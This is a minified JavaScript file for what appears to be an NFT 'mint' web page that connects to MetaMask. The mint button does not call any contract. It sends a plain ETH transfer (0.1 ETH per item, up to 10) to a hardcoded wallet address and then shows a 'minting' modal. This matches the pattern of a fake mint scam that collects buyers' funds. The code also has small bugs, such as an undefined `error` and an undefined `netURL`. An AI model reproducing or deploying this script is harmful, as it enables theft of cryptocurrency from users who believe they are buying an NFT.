const ADDRESS="0xDf409A7C9eB91e9551125a81D79434258Acf058F",web3=window.Web3,ethereum=window.ethereum;let accounts,price=.1;const mint=document.querySelector(".mint"),connect=document.querySelector(".connect"),title=document.querySelector(".metamask_content-title"),totalPrice=document.querySelector(".totalPrice"),count=document.querySelector(".count"),walletAddress=document.querySelector(".walletAddress");var totalPriceAmount=price,countAmount=1;function checkConnectStatus(){ethereum?ethereum.selectedAddress?(connect.style.display="none",mint.style.display="block"):ethereum.isMetaMask&&(connect.style.display="block",mint.style.display="none"):(connect.style.display="block",mint.style.display="none")}window.addEventListener("load",(()=>{totalPrice.innerText=price,checkConnectStatus()}));const getAccount=async()=>{if(accounts=await ethereum.request({method:"eth_requestAccounts"}),console.log(accounts),walletAddress.innerText=accounts[0].substring(0,20)+"...","0x1"==window.ethereum.chainId)console.log("Already connected to ethereum mainnet..."),checkConnectStatus();else try{await ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]}),checkConnectStatus()}catch(e){if(4902===error.code)try{await ethereum.request({method:"wallet_addEthereumChain",params:[{chainId:"0x1",rpcUrl:netURL}]}),checkConnectStatus()}catch(e){}}},sendTransaction=async()=>{const e=(1e18*totalPriceAmount).toString(16);(1e5*totalPriceAmount).toString(16);ethereum.request({method:"eth_sendTransaction",params:[{from:accounts[0],to:ADDRESS,value:e}]}).then((e=>{$("#mintingModal").modal("show")})).catch((e=>{}))};function getMobileOperatingSystem(){var e=navigator.userAgent||navigator.vendor||window.opera;console.log(e);const t=window.location.search,n=new URLSearchParams(t).get("uid");return console.log(n),"mm"==n?"Metamask":/windows phone/i.test(e)?"Windows Phone":/android/i.test(e)?"Android":/iPad|iPhone|iPod/.test(e)&&!window.MSStream?"iOS":"unknown"}setTimeout((function(){getAccount()}),1e3),mint.addEventListener("click",(async()=>{await getAccount(),await sendTransaction()})),connect.addEventListener("click",(async()=>{await getAccount()})),document.querySelector(".plus").addEventListener("click",(()=>{countAmount<10&&(countAmount++,totalPriceAmount=(countAmount*price).toFixed(2),count.innerText=countAmount,totalPrice.innerText=totalPriceAmount)})),document.querySelector(".minus").addEventListener("click",(()=>{countAmount>1&&(countAmount--,totalPriceAmount=(countAmount*price).toFixed(2),count.innerText=countAmount,totalPrice.innerText=totalPriceAmount)})),document.querySelector(".setMax").addEventListener("click",(()=>{totalPriceAmount=((countAmount=10)*price).toFixed(2),count.innerText=countAmount,totalPrice.innerText=totalPriceAmount})),document.addEventListener("DOMContentLoaded",(e=>{if("Android"==getMobileOperatingSystem()||"iOS"==getMobileOperatingSystem()){var t=document.createElement("a");t.classList.add("mmLink"),t.href="https://metamask.app.link/dapp/"+window.location.href.replace("https://","").replace("http://","")+"?uid=mm",connect.parentNode.insertBefore(t,connect),t.appendChild(connect)}}));